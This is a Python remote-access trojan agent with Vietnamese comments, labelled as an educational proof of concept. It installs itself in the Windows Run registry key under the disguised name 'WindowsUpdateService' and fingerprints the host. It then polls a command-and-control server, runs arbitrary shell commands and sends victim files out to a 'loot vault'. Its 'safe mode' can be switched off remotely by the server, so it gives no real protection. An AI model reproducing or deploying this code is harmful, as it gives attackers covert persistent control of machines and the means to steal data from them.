# ======================================================================
# DISCLAIMER: This script is part of an educational Proof of Concept (PoC) project.
# It is intended strictly for authorized testing, malware analysis research,
# and educational purposes only. Do not use this for malicious activities.
# ======================================================================

# ========================================
# THƯ VIỆN CHUẨN
# ========================================
import os
import sys
import time
import uuid
import subprocess
import platform
import getpass
import base64
import random

# ========================================
# THƯ VIỆN BÊN THỨ BA
# ========================================
import requests
import psutil

SAFE_MODE = os.getenv('C2_SAFE_MODE', 'False').strip().lower() in ('1', 'true', 'yes')
SERVER_URL = os.getenv('C2_SERVER_URL', 'http://192.168.18.35:1234')


# ========================================
# THƯ VIỆN PHỤ THUỘC HỆ THỐNG
# ========================================
if platform.system() == "Windows":
    import winreg

# Để tắt chế độ an toàn và chạy thật: gửi lệnh qua C2 
# `disable_safe_mode` hoặc đặt C2_SAFE_MODE=0
# Nếu chế độ an toàn bật thì chỉ mô phỏng lệnh, 
# không thực sự thực thi.

def get_executable_path():
    if getattr(sys, 'frozen', False):
        return sys.executable  # Nếu là file .exe
    else:
        return os.path.abspath(__file__)  # Nếu là file .py

# Thêm agent vào registry khởi động Windows
def add_to_startup():
    exe_path = get_executable_path()

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        pass

# Xóa agent khỏi registry khởi động (dọn dẹp khi tự hủy)
def remove_from_startup():
    if platform.system() != "Windows":
        return

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "WindowsUpdateService")
        winreg.CloseKey(key)
        print("[+] Registry persistence traces erased!")
    except Exception as e:
        pass

# Tạo ID bot duy nhất từ thông tin hệ thống
def get_system_info():
    if SAFE_MODE:
        return "[SAFE]_demo_user_ABCDEF"

    username = getpass.getuser()
    os_info = platform.system()[:3].upper()
    mac_addr = hex(uuid.getnode())[2:].upper()[-6:]
    return f"[{os_info}]_{username}_{mac_addr}"

# Lấy mức sử dụng CPU và RAM
def get_system_resources():
    if SAFE_MODE:
        return {
            "cpu": round(random.uniform(5, 30), 1),
            "ram": round(random.uniform(10, 40), 1)
        }

    cpu = psutil.cpu_percent(interval=None)
    ram = psutil.virtual_memory().percent
    return {"cpu": cpu, "ram": ram}

# Thu thập thông tin phần cứng chi tiết
def get_detailed_hw_info():
    if SAFE_MODE:
        return {
            "os_ver": "Windows 10 Pro (Build 19042)",
            "cpu_name": "Intel(R) Core(TM) i5-9400F CPU", 
            "gpu_name": "NVIDIA GeForce GTX 1660",
            "ram_total": "16 GB",
            "disk_total": "512 GB"
        }

    os_ver = f"{platform.system()} {platform.release()} (Build {platform.version()})"

    try:
        ram_gb = round(psutil.virtual_memory().total / (1024**3), 2)
        disk_gb = round(psutil.disk_usage(os.path.abspath(os.sep)).total / (1024**3), 2)
    except Exception:
        ram_gb, disk_gb = 0, 0

    cpu_name = platform.processor() or "Unknown CPU"

    gpu_name = "Unknown GPU"
    if platform.system() == "Windows":
        try:
            response = subprocess.run("wmic path win32_VideoController get name", shell=True, capture_output=True, text=True)
            lines = [l.strip() for l in response.stdout.split('\n') if l.strip() and l.strip() != 'Name']
            if lines:
                gpu_name = lines[0]
        except Exception:
            pass

    return {
        "os_ver": os_ver,
        "cpu_name": cpu_name,
        "gpu_name": gpu_name,
        "ram_total": f"{ram_gb} GB",
        "disk_total": f"{disk_gb} GB"
    }

# Thực hiện check-in ban đầu với C2 server
def check_in():
    sys_info = get_system_info()
    hw_info = get_detailed_hw_info()

    payload = {"bot_id": sys_info, "hw_info": hw_info}
    if SAFE_MODE:
        print("[*] [SAFE MODE] Agent in safe mode; command execution is simulated.")
    print(f"[*] Initiating check-in breach to C2 server with ID: {sys_info}...")

    try:
        response = requests.post(f"{SERVER_URL}/api/agent_checkin", json=payload)

        if response.status_code == 200:
            print(f"[+] Check-in successful! Assigned bot ID: {sys_info}")
            return sys_info
        else:
            print("[-] Check-in failed!")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[-] C2 connection breached: {e}")
        return None

# Đồng bộ với C2 để nhận lệnh và cập nhật tài nguyên
def sync_with_c2(bot_id):
    try:
        intel = get_system_resources()
        payload = {
            "bot_id": bot_id,
            "cpu": intel["cpu"],
            "ram": intel["ram"]
        }

        response = requests.post(f"{SERVER_URL}/api/sync", json=payload)

        if response.status_code == 200:
            data = response.json()
            command = data.get("task")
            if command and command.lower() != "sleep":
                print(f"[+] Command received: {command}")
            return command
    except requests.exceptions.RequestException:
        pass  # Bỏ qua lỗi mạng để tránh spam
    return None

# ========================================
# BIẾN TOÀN CỤC DUY TRÌ TRẠNG THÁI
# ========================================
current_working_dir = os.getcwd()

# Thực thi lệnh nhận được
def run_task(cmd):
    global current_working_dir
    if not cmd or cmd.lower() == "sleep":
        return "No new task. Sleeping..."

    cmd_stripped = cmd.strip()
    print(f"[*] Executing command: {cmd_stripped}")

    # Tách chuỗi lệnh ra thành các phần (ngăn cách bởi khoảng trắng)
    parts = cmd_stripped.split()
    if not parts:
        return ""

    # Lấy từ khóa lệnh đầu tiên (ví dụ: 'cd', 'upload', 'download')
    base_cmd = parts[0].lower()

    # SAFE MODE điều khiển
    global SAFE_MODE
    if base_cmd == 'enable_safe_mode':
        SAFE_MODE = True
        return "[SAFE MODE] Enabled. Commands are now simulated."
    if base_cmd == 'disable_safe_mode':
        SAFE_MODE = False
        return "[SAFE MODE] Disabled. Agent will execute real commands."
    if base_cmd == 'safe_mode_status':
        return f"[SAFE MODE] status={SAFE_MODE}"

    if SAFE_MODE:
        simulated_commands = ['ls', 'whoami', 'id', 'ifconfig', 'ip', 'pwd', 'echo', 'dir', 'uname']
        if base_cmd in simulated_commands:
            return f"[SAFE MODE] Simulated command (not executed): {cmd_stripped}\n[SAFE MODE] Command simulated successfully."
        else:
            return f"[SAFE MODE] Simulated command (not executed): {cmd_stripped}\n[SAFE MODE] Command not found in simulation."

    # Xử lý lệnh tự hủy
    if base_cmd == "suicide":

        remove_from_startup()
        print("[-] Suicide command received. Erasing traces and terminating...")
        return "SUICIDE_ACK"

    # Xử lý lệnh cd
    if base_cmd == "cd":
        if len(parts) < 2:
            return "[-] Syntax error. Use: cd <directory>"
        
        target_dir = cmd_stripped.split(" ", 1)[1].strip()
        try:
            # Chuyển đổi sang đường dẫn tuyệt đối dựa trên thư mục hiện tại của Agent
            new_path = os.path.abspath(os.path.join(current_working_dir, target_dir))
            
            if os.path.exists(new_path) and os.path.isdir(new_path):
                os.chdir(new_path)
                current_working_dir = os.getcwd()
                return f"Changed directory to: {current_working_dir}"
            else:
                return f"Error: Path not found or is not a directory: '{target_dir}'"
        except Exception as e:
            return f"Error: {str(e)}"

    # Xử lý lệnh upload (C2 -> Agent)
    if base_cmd == "upload":
        parts_upload = cmd_stripped.split(" ", 2)
        # Bắt lỗi cú pháp ngay lập tức nếu không đủ 3 phần (upload + file_c2 + dest_agent)
        if len(parts_upload) < 3:
            return "[-] Syntax error. Use: upload <file_on_c2> <dest_on_agent>"

        file_on_c2 = parts_upload[1]
        dest_on_agent = parts_upload[2]

        print(f"[*] Downloading {file_on_c2} from C2 to {dest_on_agent}...")
        try:
            response = requests.post(
                f"{SERVER_URL}/api/transfer/upload",
                json={"bot_id": agent_bot_id, "filename": file_on_c2},
                timeout=60
            )

            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    file_data = base64.b64decode(data["file_data"])
                    with open(dest_on_agent, "wb") as f:
                        f.write(file_data)
                    return f"[+] File '{file_on_c2}' deployed to '{dest_on_agent}'. Size: {len(file_data)} bytes."
                else:
                    return f"[-] C2 denied file: {data.get('message')}"
            elif response.status_code == 404:
                return f"[-] File '{file_on_c2}' not found in C2 uploads."
            else:
                return f"[-] HTTP error: {response.status_code}"

        except Exception as e:
            return f"[-] File write error on agent (check permissions): {str(e)}"

    # Xử lý lệnh download (Agent -> C2)
    if base_cmd == "download":
        # Bắt lỗi cú pháp ngay lập tức nếu không có tham số file
        if len(parts) < 2:
            return "[-] Syntax error. Use: download <file_on_agent>"

        target_file = cmd_stripped.split(" ", 1)[1].strip()

        if not os.path.exists(target_file) or not os.path.isfile(target_file):
            return f"[-] File not found or is a directory: {target_file}"

        print(f"[*] Reading and uploading {target_file} to C2...")
        try:
            with open(target_file, "rb") as f:
                encoded_data = base64.b64encode(f.read()).decode('utf-8')

            filename = os.path.basename(target_file)

            payload = {
                "bot_id": agent_bot_id,
                "filename": filename,
                "file_data": encoded_data
            }

            response = requests.post(f"{SERVER_URL}/api/transfer/download", json=payload, timeout=60)

            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    return f"[+] File '{filename}' exfiltrated to C2 loot vault."
                else:
                    return f"[-] C2 error: {data.get('message')}"
            else:
                return f"[-] Server error on upload: HTTP {response.status_code}"

        except Exception as e:
            return f"[-] File read error on agent (check permissions): {str(e)}"

    # Thực thi lệnh khác bình thường qua hệ thống Windows (Terminal/CMD)
    try:
        # Sử dụng biến toàn cục current_working_dir để duy trì trạng thái thư mục làm việc
        result_cmd = subprocess.run(
            cmd_stripped, 
            shell=True, 
            capture_output=True, 
            text=True, 
            cwd=current_working_dir
        )
        output = result_cmd.stdout + result_cmd.stderr

        if not output.strip():
            output = "[Command executed successfully, no output returned]"
        return output
    except Exception as e:
        return f"Execution Error: {str(e)}"

# Gửi kết quả lệnh về C2
def send_result(bot_id, output):
    if output == "No new task. Sleeping...":
        return
    print("[*] Transmitting results to C2...")
    payload = {"bot_id": bot_id, "result": output}

    try:
        requests.post(f"{SERVER_URL}/api/post_result", json=payload)
        print("[+] Transmission successful!")
    except requests.exceptions.RequestException as e:
        print(f"[-] Transmission failed: {e}")

# Xử lý tự hủy agent
def bot_suicide():
    farewell_msg = "[-] Suicide command received. Registry traces erased. Farewell!"
    send_result(agent_bot_id, farewell_msg)
    time.sleep(2)
    print(farewell_msg)
    sys.exit(0)

# Tự khởi động cùng Windows
add_to_startup()
# Check-in ban đầu khi khởi động
agent_bot_id = check_in()
print("[*] Syncing with C2 every 1 seconds...")

if agent_bot_id:
    while True:
        command = sync_with_c2(agent_bot_id)
        if command:
            output = run_task(command)
            if output == "SUICIDE_ACK":
                bot_suicide()
            else:
                send_result(agent_bot_id, output)

        time.sleep(1)

